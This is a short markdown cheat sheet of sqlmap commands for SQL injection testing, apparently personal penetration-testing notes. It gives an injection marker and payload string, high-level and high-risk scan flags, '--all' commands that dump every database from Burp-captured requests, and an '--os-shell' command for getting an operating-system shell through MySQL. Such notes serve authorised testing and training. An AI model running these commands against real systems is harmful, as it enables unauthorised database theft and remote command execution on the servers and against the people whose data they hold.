# sqlmap

## result output data file location
~/.local/share/sqlmap/output

## level and risk options
--level 5
--risk 3

## custom injection marker
use an asterisk symbol to mark an injection point in a URL
` http://target.box/vuln.php?a=1&b=* `

### specify exact SQL injection
close out SQL syntax correctly and include injection marker
`',1,1);select 1*---`

## search string response on site for successful injection
--string "successful injection text here"

## Test All (Default Settings)
```bash
-u "http://192.168.0.1/database/inject.php?q=user" --batch
```

## Test All (Default Settings, High Stress)
```bash
-u "http://192.168.0.1/database/inject.php?q=user" --batch --level=5 --risk=3
```

## with burp request Test All (Default Settings)
```bash
--all -r post_request.txt --batch 
```

## with burp request Test All (Default Settings, High Stress)
```bash
--all -r post_request.txt --batch --level=5 --risk=3
```

## with burp request Get A Reverse Shell (MySQL)
```bash
-r post_request.txt --dbms "mysql" --os-shell
```
